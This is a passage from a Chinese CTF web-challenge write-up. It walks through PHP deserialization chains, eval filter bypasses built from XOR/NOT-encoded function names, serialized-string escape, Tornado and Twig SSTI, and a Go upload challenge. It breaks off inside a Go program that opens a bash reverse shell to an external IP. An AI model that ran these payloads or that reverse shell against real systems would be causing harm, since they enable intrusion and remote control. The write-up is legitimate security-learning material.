CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;http://127.0.0.1:65500/&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$b</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:1:&quot;a&quot;;O:8:&quot;Backdoor&quot;:3:&#123;s:1:&quot;a&quot;;O:10:&quot;FileViewer&quot;:3:&#123;s:10:&quot;black_list&quot;;s:3:&quot;111&quot;;s:5:&quot;local&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;&#125;s:1:&quot;b&quot;;s:5:&quot;local&quot;;s:11:&quot;superhacker&quot;;s:23:&quot;http://127.0.0.1:65500/&quot;;&#125;s:1:&quot;a&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>用到gc回收机制等</p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过两个if即可实现命令执行</p><p>首先看看过滤的东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00-\x20，0-1，&#x27;&quot;`$&amp;.,|[]&#123;_defgops&#125;+和\x7F</span><br></pre></td></tr></table></figure><p>再看下面的if，count_chars第二个参数为3，</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218143940345.png" alt="image-20241218143940345" style="zoom:67%;" /><p>也就是不能使用超过13种字符！、</p><p>接下来，有一种办法可以看我们到底可以用哪些内置函数！！！好办法！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">get_defined_functions</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$array</span>[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arr</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$arr</span>) )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">count_chars</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )<span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$arr</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218144520020.png" alt="image-20241218144520020"></p><p>获取可用函数</p><p>但是我们没有发现可供我们使用的函数，该怎么办呢？</p><p>我们接着看过滤，发现异或，取反之类的没有被过滤，可以考虑用他们来绕过。</p><p>尝试取反</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;phpinfo&#x27;));</span><br><span class="line">//%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150653705.png" alt="image-20241218150653705"></p><p>成功执行phpinfo</p><p>接下来我们可以看看disable function</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150726126.png" alt="image-20241218150726126"></p><p>print_r()，scandir()之类的可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~(&#x27;print_r&#x27;));</span><br><span class="line">//%8F%8D%96%91%8B%A0%8D</span><br><span class="line">echo urlencode(~(&#x27;scandir&#x27;));</span><br><span class="line">//%8C%9C%9E%91%9B%96%8D</span><br><span class="line">echo urlencode(~(&#x27;.&#x27;));</span><br><span class="line">//%D1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(~%D1));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p>这里总共15个字符，超过了两个</p><p>但是这里字符种类超过限制，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">ord</span>(s) ^ <span class="number">0xff</span>)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="string">&#x27;printrscandir&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> p:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> p:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(j) ^ <span class="built_in">ord</span>(k) ^ <span class="built_in">ord</span>(m) == <span class="built_in">ord</span>(i):</span><br><span class="line">                    <span class="keyword">if</span>(j == k <span class="keyword">or</span> j == m <span class="keyword">or</span> m == k):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(i+<span class="string">&#x27;==&#x27;</span>+j + <span class="string">&#x27;^&#x27;</span> + k + <span class="string">&#x27;^&#x27;</span>+m, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">&#x27;&#123;:0&gt;2&#125;  =&gt;  [&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;]&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                en(i), en(j), en(k), en(m)))</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n==d^i^c91  =&gt;  [&quot;9b&quot;,&quot;96&quot;,&quot;9c&quot;]</span><br><span class="line">p==r^a^c8f  =&gt;  [&quot;8d&quot;,&quot;9e&quot;,&quot;9c&quot;]</span><br><span class="line">t==d^s^c8b  =&gt;  [&quot;9b&quot;,&quot;8c&quot;,&quot;9c&quot;]</span><br></pre></td></tr></table></figure><p>print_r(scandir(‘.’))</p><p>往下变：以下两种都行，可以构造很多很多种，替换哪种都没事！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%8d%96%9b%9b%a0%8d)^(%9e%ff%ff%96%8c%ff%ff)^(%9c%ff%ff%9c%9c%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%8d)^(%ff%ff%ff%96%ff%ff%ff)^(%ff%ff%ff%9c%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218164943899.png" alt="image-20241218164943899"></p><p>想要读取的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(&#x27;.&#x27;)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((%8D%9A%9E%9B%99%96%93%9A)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%9A%91%9B)^(%ff%ff%ff))</span><br><span class="line">((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%D1)^(%ff))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d==l^a^i9b  =&gt;  [&quot;93&quot;,&quot;9e&quot;,&quot;96&quot;]</span><br><span class="line">i==f^n^a96  =&gt;  [&quot;99&quot;,&quot;91&quot;,&quot;9e&quot;]</span><br><span class="line">c==a^l^n9c  =&gt;  [&quot;9e&quot;,&quot;93&quot;,&quot;91&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里不太清楚这个序列化后是长啥样的，本地跑一下看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:5:&quot;b1234&quot;;s:3:&quot;img&quot;;s:40:&quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这个sha1是需要绕过的！</p><p>但是这要咋绕啊？发现有个filter会过滤掉字符串，可以考虑字符串逃逸，把img逃逸出来，我们可以自己构造！</p><p>存在extract($_POST);变量覆盖！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br></pre></td></tr></table></figure><p>这俩都是可控的。</p><p>function可控，我们在里面弄img然后闭合就行，那么我们用user来进行逃逸，吞掉<code>&quot;;s:8:&quot;function&quot;;s:xx:&quot;</code>，23个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagphp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>有个hint就是d0g3_f1ag.php</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124913426.png" alt="image-20241220124913426" style="zoom:80%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124906163.png" alt="image-20241220124906163" style="zoom:80%;" /><p>ok拿捏了。&#x2F;d0g3_fllllllag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220125010556.png" alt="image-20241220125010556" style="zoom:80%;" /><p>NSSCTF{eb4bcc79-d54c-4437-af0a-d13b88c05373}</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开页面有三个超链接，集成一下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">fa7aa3ea2a63d3e3f984fc2f952b9d95</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">9dd148c6b068df197ef0c4d592565839</span><br><span class="line"></span><br><span class="line">/flag.txt</span><br><span class="line">7f5f6f0a3e742f57e0c66c6e2989e494</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure><p>我们需要获取cookie_secret的值</p><p>而我们查官方文档，tornado在搭建一个网站时，肯定会有多个handler，而这些handler都是RequestHandler的子类</p><p>RequestHandler.settings又指向self.application.settings</p><p>所以我们可以说handler.settings指向了RequestHandler.settings了，对吧</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220205948150.png" alt="image-20241220205948150"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">128f7343-bd58-429c-80c6-c72b604e2aaf</span><br></pre></td></tr></table></figure><p>然后验证一下，用flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt md5 =&gt; 40dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce3740dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">9c2b962c16d37c4d7e8d2731f5d589b4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce373bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">256ccf8b76c09059ce6fa48edd653af9</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220210832925.png" alt="image-20241220210832925"></p><h2 id="BJDCTF-2020-Cookie-is-so-subtle"><a href="#BJDCTF-2020-Cookie-is-so-subtle" class="headerlink" title="[BJDCTF 2020]Cookie is so subtle!"></a>[BJDCTF 2020]Cookie is so subtle!</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130223596.png" alt="image-20241221130223596"></p><p>flag界面存在ssti，是twig模板引擎的ssti</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130251349.png" alt="image-20241221130251349" style="zoom: 67%;" /><p>发现他会把username的值设置为cookie！</p><p>同时页面也会回显123.</p><p>cookie处可能存在ssti</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221131100031.png" alt="image-20241221131100031" style="zoom: 67%;" /><p>实锤了，想办法看其他目录</p><p>这里想了半天，突然想起来，ls &#x2F;是一列一列输出的，所以这里只输出了第一行，我们让他成行输出即可！</p><p>刚开始试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -m /   不太行，只有几个</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | xargs   可以</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132103107.png" alt="image-20241221132103107" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132132933.png" alt="image-20241221132132933" style="zoom:67%;" /><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210444624.png" alt="image-20241221210444624"></p><p>就一个文件上传的功能点，上传试试</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210459298.png" alt="image-20241221210459298" style="zoom: 67%;" /><p>这波….</p><p>go webshell？？go help？？？这是用go执行了我的文件名吗？</p><p>上传文件名为help试试</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210551031.png" alt="image-20241221210551031" style="zoom: 67%;" /><p>这是？？</p><p>命令执行(go 文件名前缀 文件上传的路径)？</p><p>能不能让他go run go文件</p><p>go run run.go？？</p><p>可以吗？</p><p>run.go文件如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span 